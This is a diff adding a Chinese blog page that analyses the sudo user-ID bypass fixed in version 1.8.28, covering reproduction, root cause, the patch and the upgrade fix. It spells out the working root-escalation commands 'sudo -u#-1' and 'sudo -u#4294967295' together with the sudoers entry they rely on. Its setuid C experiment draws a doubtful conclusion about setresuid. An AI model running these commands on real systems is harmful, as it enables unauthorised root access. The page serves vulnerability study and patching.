@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+    <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+    <link rel="icon" type="image/png" href="/img/favicon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="description" content>
+    <meta name="author" content="Crazy-wen">
+    <meta name="keywords" content>
+    <title>权限绕过漏洞 ~ Crazy-wen&#39;s Blog</title>
+    <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css?v=5.7.2">
+    <link rel="stylesheet" href="/lib/mdbootstrap/css/bootstrap.min.css?v=4.3.1">
+    <link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css?v=4.8.7">
+    <link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
+    <link rel="stylesheet" href="/lib/nprogress/nprogress.css?v=0.2.0">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+    
+        <link rel="stylesheet" href="/lib/prettify/atelier-seaside-light.min.css">
+    
+    <link rel="stylesheet" href="/css/main.css">
+    
+    
+<script type="text/javascript">
+
+ <script>
+var _hmt = _hmt || [];
+_hmt.push(['_setPageTag', id, value]);
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d2c7132109d78f54ab072ec83dfe40e1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+
+</head>
+
+
+<body>
+<header style="height: 100vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+<div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Crazy-wen&#39;s Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav ml-auto text-center">
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/">Home</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/archives/">Archives</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/categories/">Categories</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/tags/">Tags</a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+
+</nav>
+    <div class="view intro-2"
+         style="background: url('/img/post.jpg')no-repeat center center;background-size: cover;">
+        <div class="full-bg-img">
+            <div class="mask rgba-black-light flex-center">
+                <div class="container text-center white-text wow fadeInUp">
+                    <span  class="h1"  id="subtitle">
+                        
+                    </span>
+                    
+                        <br>
+                        <p>Monday, October 21st 2019, 8:18 am</p>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<main>
+    
+        
+
+
+
+
+<div class="container-fluid">
+    <div class="row">
+        <div class="d-none d-lg-block col-lg-2"></div>
+            <div class="col-lg-8 nopadding-md">
+                <div class="py-5 z-depth-3 board">
+                    <div class="post-content mx-auto">
+                        <div class="markdown-body">
+                            <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>sudo，也就是以超级管理员身份运行（superuser do）的意思。sudo 是 Linux 中最常使用的重要实用程序之一，它功能十分强大，几乎安装在每一款基于 UNIX 或 Linux 的操作系统上，也是这些操作系统的核心命令。作为一个系统命令，普通用户可通过它以特殊权限来运行程序或命令（通常以 root 用户身份运行命令），而无需切换使用环境。</p>
+<p>该漏洞通过特定payload，用户可提升至root权限</p>
+<p>利用前提：</p>
+<ul>
+<li>sudo -v &lt; 1.8.28</li>
+<li>当前处于root用户或知道当前用户的密码</li>
+<li>当前用户存在于sudo权限列表</li>
+</ul>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>Ubuntu 16.04</p>
+<pre><code class="bash">$ sudo -V
+Sudo version 1.8.16
+Sudoers policy plugin version 1.8.16
+Sudoers file grammar version 45
+Sudoers I/O plugin version 1.8.16
+$ su root
+Password: 
+su: Authentication failure      //需要设置root密码
+$ sudo passwd root    
+Enter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+$ su -
+Password: 
+root@ubuntu:/# useradd test
+root@ubuntu:/# passwd test
+Enter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+root@ubuntu:/home/hihi# cat /etc/passwd
+
+test:x:1001:1001::/home/test:
+root@ubuntu:/# vi /etc/sudoers </code></pre>
+<ul>
+<li>在<code>root    ALL=(ALL:ALL) ALL</code>下面添加<code>test    ALL=(ALL:!ALL) ALL</code></li>
+</ul>
+<pre><code class="shell">#
+# This file MUST be edited with the &#39;visudo&#39; command as root.
+#
+# Please consider adding local content in /etc/sudoers.d/ instead of
+# directly modifying this file.
+#
+# See the man page for details on how to write a sudoers file.
+#
+Defaults        env_reset
+Defaults        mail_badpass
+Defaults        secure_path=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin&quot;
+
+# Host alias specification
+
+# User alias specification
+
+# Cmnd alias specification
+
+# User privilege specification
+root    ALL=(ALL:ALL) ALL
+test    ALL=(ALL:!ALL) ALL
+# Members of the admin group may gain root privileges
+%admin ALL=(ALL) ALL
+
+# Allow members of group sudo to execute any command
+%sudo   ALL=(ALL:ALL) ALL
+
+# See sudoers(5) for more information on &quot;#include&quot; directives:
+
+#includedir /etc/sudoers.d
+</code></pre>
+<pre><code class="shell">root@ubuntu:~# su test
+test@ubuntu:/root$ whoami
+test
+test@ubuntu:/root$ sudo -u#-1 whoami
+[sudo] password for test: 
+root
+test@ubuntu:/root$ whoami
+test
+test@ubuntu:/root$ sudo -u#4294967295 whoami
+root</code></pre>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>1、之所以会产生这个漏洞，是因为将用户 ID 转换为用户名的函数会将 -1（或无效等效的 4294967295）误认为是 0，而这正好是 root 用户 User ID 。此外，由于通过 -u 选项指定的 User ID 在密码数据库中不存在，因此不会运行任何 PAM 会话模块。</p>
+<blockquote>
+<p>PAM 会话模块：可以向用户、服务或设备显示消息，并从中收集输入内容。会话可采用多种形式，例如，文本终端设备中常见的”Login:”提示</p>
+</blockquote>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>官方代码仓库找到提交的修复代码<br><a href="https://www.sudo.ws/repos/sudo/rev/83db8dba09e7" target="_blank" rel="noopener">https://www.sudo.ws/repos/sudo/rev/83db8dba09e7</a></p>
+<ul>
+<li>“+”号代表增加的代码</li>
+</ul>
+<pre><code class="c">+    /* Disallow id -1, which means &quot;no change&quot;. */
++    if (!valid_separator(p, ep, sep) || llval == -1 || llval == (id_t)UINT_MAX) {
+             if (errstr != NULL)
+                     *errstr = N_(&quot;invalid value&quot;);
+             errno = EINVAL;
+             goto done;
+     }</code></pre>
+<ul>
+<li><p>valid_separator：确保ID以有效的分隔符char结尾，即“\0”。</p>
+</li>
+<li><p>llval 变量为解析后的值，if语句的意义为不允许 llval 为 -1 和 UINT_MAX（4294967295）</p>
+</li>
+<li><p>也就是说修复补丁只限制了取值而已，从漏洞行为来看，如果为 -1，最后得到的 UID 却是 0（即root用户），为什么不能为 -1？当 UID 为 -1 的时候，发生了什么呢？继续深入分析一下。</p>
+</li>
+<li><p>先用 strace 跟踪下系统调用看看：</p>
+<blockquote>
+<p>strace作为一种动态跟踪工具，能够帮助运维高效地定位进程和服务故障。它像是一个侦探，通过系统调用的蛛丝马迹，告诉你异常的真相。</p>
+</blockquote>
+</li>
+<li><p>执行<code>strace -u test sudo -u#-1 id</code>输出系统调用</p>
+</li>
+</ul>
+<blockquote>
+<p>strace -u username<br>以username 的UID和GID执行被跟踪的命令</p>
+</blockquote>
+<ul>
+<li>因为 strace -u 参数需要 root 身份才能使用，因此上面命令需要先切换到 root 帐号下，然后用 test_sudo 身份执行了   <code>sudo -u#-1 id</code>  命令。从输出的系统调用中，注意到</li>
+</ul>
+<p><code>setresuid(-1, -1, -1)                   = 0</code></p>
+<ul>
+<li>可以知道，sudo 内部调用了 setresuid 来提升权限（虽然还调用了其他设置组之类的函数，但先不做分析），并且传入的参数都是 -1。</li>
+<li>因此，我们做一个简单的实验来调用 setresuid(-1, -1, -1) ，看看为什么执行后会是 root 身份，代码如下：</li>
+</ul>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+int main() {
+  setresuid(-1, -1, -1);
+  setuid(0);
+  printf(&quot;EUID: %d, UID: %d\n&quot;, geteuid(), getuid());
+  return 0;}</code></pre>
+<ul>
+<li>使用g++编译</li>
+<li>注意，使用<code>chmod +s a.out</code>给a.out+s位,使其他帐号执行时就会以文件所属帐号的身份运行</li>
+<li>运行，得到以下结果<pre><code>EUID: 0, UID: 0</code></pre></li>
+<li>可知当前身份变成了root，因此得出结论，该漏洞主要利用<code>setresuid(-1,-1,-1)</code>来提升权限</li>
+</ul>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>将 sudo 升级到 1.8.28 最新版本，该漏洞会影响 1.8.28 之前的所有版本。</p>
+<h3 id="修复后"><a href="#修复后" class="headerlink" title="修复后"></a>修复后</h3><pre><code>test@ubuntu:/$ sudo -u#-1 id
+sudo: unknown user: #-1
+sudo: unable to initialize policy plugin</code></pre>
+                            <hr>
+                        </div>
+                        <br>
+                        <div>
+                            
+                            <p>
+                                <i class="iconfont icon-tag"></i>
+                                
+                            </p>
+                            
+                                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+                            
+                        </div>
+                    </div>
+                </div>
+            </div>
+        <div class="d-none d-lg-block col-lg-2 toc-container">
+            
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i> Toc:</p> 
+    <div id="tocbot"></div>
+  </div>
+
+        </div>
+    </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+    <div class="container comments mx-auto" id="comments">
+        
+            <br><br>
+            
+            <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script>               
+        var disqus_shortname = '';
+        var disqus_config = function () {
+            this.page.url = 'http://127.0.0.1:4000/2019/10/21/权限绕过漏洞/'; 
+            this.page.identifier = '/2019/10/21/权限绕过漏洞/';
+        };
+        (function() { 
+            var d = document, s = d.createElement('script');
+            s.type = 'text/javascript';
+            s.src = '//'+disqus_shortname+'.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow noopener">comments powered by Disqus.</a></noscript>
+</div>
+        
+    </div>
+</div>
+    
+</main>
+
+<footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/0x2e/Material-T" target="_blank" rel="nofollow noopener"> <b>Material-T</b></a>
+    <br>
+    
+  </div>
+</footer>
+
+  <!-- SCRIPTS -->
+  <script src="/lib/mdbootstrap/js/jquery-3.4.1.min.js"></script>
+  <script src="/lib/mdbootstrap/js/popper.min.js"></script>
+  <script src="/lib/mdbootstrap/js/bootstrap.min.js?v=4.3.1"></script>
+  <script src="/lib/mdbootstrap/js/mdb.min.js?v=4.8.7"></script>
+  <script src="/lib/nprogress/nprogress.min.js?v=0.2.0"></script>
+  <script src="/js/main.js"></script>
+  
+    
+      <script src="/lib/tocbot/tocbot.min.js?v=4.7.0"></script>
+    
+    <script src="/js/post.js"></script>
+  
+  
+    <script src="/lib/prettify/prettify.min.js?v=0.1.0"></script>
+    <script>
+      $(document).ready(function(){
+        $('pre').addClass('prettyprint linenums');
+        prettyPrint();
+      })
+    </script>
+  
+  
+    <script src="/lib/typed/typed.min.js?v=2.0.9"></script>
+    <script>
+        var typed = new Typed('#subtitle', {
+          strings: [
+            '  ',
+            "权限绕过漏洞&nbsp;",
+        ],
+        cursorChar: "_",
+        typeSpeed: 70,
+        startDelay: 300, //开始之前延迟300毫秒
+        loop: false,
+        });
+        $(".typed-cursor").addClass("h2");
+    </script>
+  
+  
+    <script src="/lib/anchor/anchor.min.js?v=4.2.0"></script>
+    <script>
+      anchors.options = {
+        placement: "right",
+        visible: "true",
+        
+      };
+      anchors.add(".post-content > h1,h2,h3,h4,h5,h6");
+    </script>
+  
+
+  
+</body>
+</html>
